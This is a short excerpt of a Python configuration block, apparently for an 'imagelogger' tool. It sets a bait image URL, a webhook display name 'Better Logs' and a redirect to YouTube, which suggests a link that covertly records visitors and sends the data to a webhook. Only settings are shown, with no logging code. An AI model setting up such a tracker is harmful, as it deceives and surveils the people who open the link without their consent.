...
config = {
    ...
    "image": "https://th.bing.com/th/id/OIP", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Better Logs", # Set this to the name you want the webhook to have
    ...
    "redirect": {
        ...
        "page": "https://youtube.com/" # Link to the webpage to redirect to 
    },
